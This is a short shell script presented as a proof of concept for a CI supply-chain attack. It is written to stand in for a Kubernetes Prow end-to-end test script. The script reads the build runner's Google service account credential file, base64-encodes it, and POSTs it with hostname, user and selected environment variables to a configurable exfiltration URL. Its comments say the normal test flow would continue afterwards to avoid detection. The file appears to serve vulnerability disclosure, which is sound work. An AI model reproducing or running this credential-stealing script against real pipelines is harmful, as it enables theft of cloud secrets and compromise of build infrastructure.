#!/bin/sh
# POC-ONLY malicious replacement for ii/kind/ci-audit-logging/hack/ci/e2e-k8s.sh
# Demonstrates: an attacker who replaces the script content at the mutable
# branch reference can read $GOOGLE_APPLICATION_CREDENTIALS and exfiltrate
# the contents from inside the Kubernetes Prow build runner.
#
# Hosted in goat63262/kind-poc-demo for DEMO purposes only.
# NOT pushed to ii/kind (out of scope).

set -e

EXFIL_URL="${POC_EXFIL_URL:-http://127.0.0.1:8080/exfil}"
SA_FILE="${GOOGLE_APPLICATION_CREDENTIALS:-/etc/service-account/service-account.json}"

echo ">>> [PoC] attacker script executing in Prow runner context"
echo ">>> [PoC] hostname=$(hostname)"
echo ">>> [PoC] whoami=$(whoami 2>/dev/null || id -un 2>/dev/null || echo unknown)"
echo ">>> [PoC] GOOGLE_APPLICATION_CREDENTIALS=$SA_FILE"

SA_B64=""
SA_LEN=0
if [ -r "$SA_FILE" ]; then
  SA_B64=$(base64 -w0 < "$SA_FILE" 2>/dev/null || base64 < "$SA_FILE" | tr -d '\n')
  SA_LEN=$(wc -c < "$SA_FILE" | tr -d ' ')
  echo ">>> [PoC] SA file readable: $SA_LEN bytes; base64 length $(printf '%s' "$SA_B64" | wc -c | tr -d ' ')"
else
  echo ">>> [PoC] SA file NOT readable at $SA_FILE"
fi

curl -sS -X POST "$EXFIL_URL" \
  --data-urlencode "proof=k8s_prow_build_sa_file_readable_by_attacker_script" \
  --data-urlencode "hostname=$(hostname)" \
  --data-urlencode "whoami=$(whoami 2>/dev/null || id -un 2>/dev/null || echo unknown)" \
  --data-urlencode "sa_file_path=$SA_FILE" \
  --data-urlencode "sa_file_bytes=$SA_LEN" \
  --data-urlencode "sa_b64=$SA_B64" \
  --data-urlencode "pwd=$(pwd)" \
  --data-urlencode "env_dump=$(env 2>/dev/null | grep -E '^(GOOGLE_|GCP_|HOME|HOSTNAME|JOB_|BUILD_|PROW_)' | base64 -w0 2>/dev/null || true)"

echo ">>> [PoC] Exfiltration POST sent to $EXFIL_URL"
echo ">>> [PoC] Legitimate test flow would normally continue here (kind cluster, ginkgo...) to avoid detection."
